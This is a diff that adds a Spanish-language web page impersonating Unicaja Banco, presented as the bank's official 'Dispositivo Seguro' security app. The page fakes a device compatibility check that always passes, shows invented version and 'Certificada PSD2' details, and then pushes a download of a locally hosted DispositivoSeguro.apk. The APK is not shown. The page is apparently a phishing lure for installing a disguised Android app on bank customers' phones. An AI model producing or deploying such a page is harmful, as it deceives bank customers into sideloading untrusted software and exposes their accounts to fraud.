@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+    <meta name="theme-color" content="#01875f" />
+    <title>Dispositivo Seguro - Unicaja Banco</title>
+    <meta name="description" content="Descarga la aplicación Dispositivo Seguro de Unicaja Banco.">
+
+    <!-- Font -->
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #01875f 0%, #006646 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            overflow-x: hidden;
+            -webkit-font-smoothing: antialiased;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 50px;
+            box-shadow: 0 25px 70px rgba(0, 0, 0, 0.25);
+            max-width: 650px;
+            width: 100%;
+            animation: slideIn 0.6s ease-out;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(40px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+        }
+
+        .logo {
+            width: 90px;
+            height: 90px;
+            margin: 0 auto 25px;
+            background: #01875f;
+            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: pulse 2.5s ease-in-out infinite;
+            box-shadow: 0 8px 25px rgba(1, 135, 95, 0.3);
+        }
+
+        .logo svg {
+            width: 50px;
+            height: 50px;
+        }
+
+        @keyframes pulse {
+
+            0%,
+            100% {
+                transform: scale(1);
+                box-shadow: 0 8px 25px rgba(1, 135, 95, 0.3);
+            }
+
+            50% {
+                transform: scale(1.05);
+                box-shadow: 0 12px 35px rgba(1, 135, 95, 0.5);
+            }
+        }
+
+        h1 {
+            color: #1a1a1a;
+            font-size: 32px;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: #666;
+            font-size: 16px;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .app-info {
+            background: #f9f9f9;
+            border-radius: 12px;
+            padding: 25px;
+            margin-bottom: 30px;
+        }
+
+        .info-item {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 15px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .info-item:last-child {
+            margin-bottom: 0;
+            padding-bottom: 0;
+            border-bottom: none;
+        }
+
+        .info-icon {
+            width: 40px;
+            height: 40px;
+            background: #e6f7f0;
+            border-radius: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+
+        .info-icon svg {
+            width: 22px;
+            height: 22px;
+            color: #01875f;
+        }
+
+        .info-text {
+            flex: 1;
+        }
+
+        .info-label {
+            font-size: 12px;
+            color: #888;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            margin-bottom: 4px;
+        }
+
+        .info-value {
+            font-size: 16px;
+            font-weight: 600;
+            color: #1a1a1a;
+        }
+
+        .download-btn {
+            background: linear-gradient(135deg, #01875f 0%, #00a673 100%);
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            border-radius: 50px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            box-shadow: 0 8px 25px rgba(1, 135, 95, 0.4);
+            transition: all 0.3s ease;
+            display: inline-flex;
+            align-items: center;
+            gap: 12px;
+            width: 100%;
+            justify-content: center;
+        }
+
+        .download-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 35px rgba(1, 135, 95, 0.6);
+        }
+
+        .download-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .download-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        /* Version Check Screen */
+        .version-check-screen {
+            text-align: center;
+        }
+
+        .version-spinner {
+            width: 60px;
+            height: 60px;
+            border: 6px solid #e6f7f0;
+            border-top-color: #01875f;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        .version-info {
+            background: #f9f9f9;
+            border-radius: 15px;
+            padding: 25px;
+            margin-top: 30px;
+            text-align: left;
+        }
+
+        .version-detail {
+            font-size: 14px;
+            margin: 12px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+            border-bottom: 1px solid #e0e0e0;
+        }
+
+        .version-detail:last-child {
+            border-bottom: none;
+        }
+
+        .version-label {
+            color: #666;
+            font-weight: 500;
+        }
+
+        .version-value {
+            font-weight: 700;
+            color: #1a1a1a;
+        }
+
+        .version-value.success {
+            color: #01875f;
+        }
+
+        .version-value.warning {
+            color: #f59e0b;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        .fade-in {
+            animation: fadeInUp 0.5s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .footer {
+            text-align: center;
+            color: #888;
+            font-size: 13px;
+            padding-top: 25px;
+            border-top: 2px solid #f0f0f0;
+            margin-top: 30px;
+        }
+
+        .status-message {
+            text-align: center;
+            padding: 15px;
+            border-radius: 10px;
+            margin-bottom: 20px;
+            font-size: 14px;
+            font-weight: 500;
+        }
+
+        .status-message.checking {
+            background: #e6f3ff;
+            color: #0066cc;
+        }
+
+        .status-message.success {
+            background: #e6f7f0;
+            color: #01875f;
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 30px 20px;
+            }
+
+            h1 {
+                font-size: 26px;
+            }
+
+            .download-btn {
+                padding: 16px 40px;
+                font-size: 16px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Initial Screen -->
+        <div id="initialScreen">
+            <div class="header">
+                <div class="logo">
+                    <!-- Shield Icon -->
+                    <svg fill="white" viewBox="0 0 24 24">
+                        <path
+                            d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
+                    </svg>
+                </div>
+                <h1>Dispositivo Seguro</h1>
+                <div class="subtitle">Aplicación oficial de seguridad de Unicaja Banco para proteger tus operaciones
+                    bancarias</div>
+            </div>
+
+            <div class="app-info">
+                <div class="info-item">
+                    <div class="info-icon">
+                        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round"
+                                d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+                        </svg>
+                    </div>
+                    <div class="info-text">
+                        <div class="info-label">Versión</div>
+                        <div class="info-value">4.2.1</div>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">
+                        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round"
+                                d="M3 16.5v2.25A2.25 2.25 0 005.25 21h13.5A2.25 2.25 0 0021 18.75V16.5M16.5 12L12 16.5m0 0L7.5 12m4.5 4.5V3" />
+                        </svg>
+                    </div>
+                    <div class="info-text">
+                        <div class="info-label">Tamaño</div>
+                        <div class="info-value">41.7 MB</div>
+                    </div>
+                </div>
+                <div class="info-item">
+                    <div class="info-icon">
+                        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                            <path stroke-linecap="round" stroke-linejoin="round"
+                                d="M9 12.75L11.25 15 15 9.75m-3-7.036A11.959 11.959 0 013.598 6 11.99 11.99 0 003 9.749c0 5.592 3.824 10.29 9 11.623 5.176-1.332 9-6.03 9-11.622 0-1.31-.21-2.571-.598-3.751h-.152c-3.196 0-6.1-1.248-8.25-3.285z" />
+                        </svg>
+                    </div>
+                    <div class="info-text">
+                        <div class="info-label">Seguridad</div>
+                        <div class="info-value">Certificada PSD2</div>
+                    </div>
+                </div>
+            </div>
+
+            <button class="download-btn" onclick="startVersionCheck()" id="checkBtn">
+                <span>🔍</span>
+                <span>Comprobar Versión</span>
+            </button>
+
+            <div class="footer">
+                🔒 Conexión segura • Unicaja Banco S.A.
+            </div>
+        </div>
+
+        <!-- Version Check Screen -->
+        <div id="versionCheckScreen" class="version-check-screen hidden">
+            <div class="header">
+                <div class="logo">
+                    <svg fill="white" viewBox="0 0 24 24">
+                        <path
+                            d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" />
+                    </svg>
+                </div>
+                <h1>Verificando Dispositivo</h1>
+            </div>
+
+            <div id="statusMessage" class="status-message checking">
+                Comprobando compatibilidad con tu dispositivo...
+            </div>
+
+            <div id="loadingSpinner" class="version-spinner"></div>
+
+            <div class="version-info" id="versionInfo">
+                <div class="version-detail">
+                    <span class="version-label">Sistema Operativo:</span>
+                    <span class="version-value" id="osVersion">Detectando...</span>
+                </div>
+                <div class="version-detail">
+                    <span class="version-label">Versión de Android:</span>
+                    <span class="version-value" id="androidVersion">Verificando...</span>
+                </div>
+                <div class="version-detail">
+                    <span class="version-label">Estado:</span>
+                    <span class="version-value" id="statusVersion">Comprobando...</span>
+                </div>
+            </div>
+
+            <button class="download-btn hidden" onclick="downloadAPK()" id="downloadBtn">
+                <span>📥</span>
+                <span>Descargar Aplicación</span>
+            </button>
+
+            <div class="footer">
+                🔒 Conexión segura • Unicaja Banco S.A.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function startVersionCheck() {
+            const initialScreen = document.getElementById('initialScreen');
+            const versionCheckScreen = document.getElementById('versionCheckScreen');
+            const checkBtn = document.getElementById('checkBtn');
+
+            // Disable button
+            checkBtn.disabled = true;
+
+            // Hide initial screen, show version check
+            initialScreen.classList.add('hidden');
+            versionCheckScreen.classList.remove('hidden');
+            versionCheckScreen.classList.add('fade-in');
+
+            // Start detection
+            detectSystemInfo();
+        }
+
+        function detectSystemInfo() {
+            const userAgent = navigator.userAgent;
+            const osVersionEl = document.getElementById('osVersion');
+            const androidVersionEl = document.getElementById('androidVersion');
+            const statusVersionEl = document.getElementById('statusVersion');
+            const statusMessage = document.getElementById('statusMessage');
+            const loadingSpinner = document.getElementById('loadingSpinner');
+            const downloadBtn = document.getElementById('downloadBtn');
+
+            console.log('User Agent:', userAgent); // Debug
+
+            // Step 1: Detect OS
+            setTimeout(() => {
+                let osName = 'Desconocido';
+                let isAndroid = false;
+
+                // Use real detection methods from StackOverflow
+                if (/Android/i.test(userAgent)) {
+                    osName = 'Android';
+                    isAndroid = true;
+                } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
+                    osName = 'iOS';
+                } else if (/Windows/i.test(userAgent)) {
+                    osName = 'Windows';
+                } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
+                    osName = 'macOS';
+                } else if (/Linux/i.test(userAgent)) {
+                    osName = 'Linux';
+                }
+
+                osVersionEl.textContent = osName;
+                console.log('Detected OS:', osName); // Debug
+            }, 800);
+
+            // Step 2: Detect Android version - REAL DETECTION ONLY
+            setTimeout(() => {
+                let androidVersion = 'N/A';
+
+                // REAL Android version detection using regex from StackOverflow
+                const androidMatch = userAgent.match(/Android\s([0-9\.]+)/i);
+
+                if (androidMatch && androidMatch[1]) {
+                    androidVersion = androidMatch[1];
+                    console.log('Detected Android version:', androidVersion); // Debug
+                } else {
+                    console.log('No Android version found (not Android or version not in UA)'); // Debug
+                }
+
+                androidVersionEl.textContent = androidVersion;
+            }, 1500);
+
+            // Step 3: Show final status
+            setTimeout(() => {
+                const isCompatible = true; // Always compatible for now
+
+                if (isCompatible) {
+                    statusVersionEl.textContent = 'Compatible ✓';
+                    statusVersionEl.classList.add('success');
+                    statusMessage.textContent = '✅ Dispositivo compatible verificado';
+                    statusMessage.classList.remove('checking');
+                    statusMessage.classList.add('success');
+                } else {
+                    statusVersionEl.textContent = 'No Compatible ✗';
+                    statusVersionEl.classList.add('warning');
+                    statusMessage.textContent = '⚠️ Dispositivo no compatible';
+                    statusMessage.classList.remove('checking');
+                }
+
+                // Hide spinner
+                loadingSpinner.classList.add('hidden');
+
+                // Show download button
+                setTimeout(() => {
+                    downloadBtn.classList.remove('hidden');
+                    downloadBtn.classList.add('fade-in');
+                }, 300);
+            }, 2500);
+        }
+
+        function downloadAPK() {
+            const downloadBtn = document.getElementById('downloadBtn');
+            downloadBtn.disabled = true;
+            downloadBtn.innerHTML = '<span>⬇️</span><span>Descargando...</span>';
+
+            // Trigger download with proper method
+            const link = document.createElement('a');
+            link.href = './DispositivoSeguro.apk';
+            link.download = 'DispositivoSeguro.apk';
+            link.style.display = 'none';
+
+            document.body.appendChild(link);
+            link.click();
+
+            setTimeout(() => {
+                document.body.removeChild(link);
+                downloadBtn.innerHTML = '<span>✅</span><span>Descarga Iniciada</span>';
+            }, 500);
+        }
+
+        // Debug: Show user agent on console
+        console.log('=== DEVICE DETECTION DEBUG ===');
+        console.log('User Agent:', navigator.userAgent);
+        console.log('Platform:', navigator.platform);
+    </script>
+</body>
+
+</html>
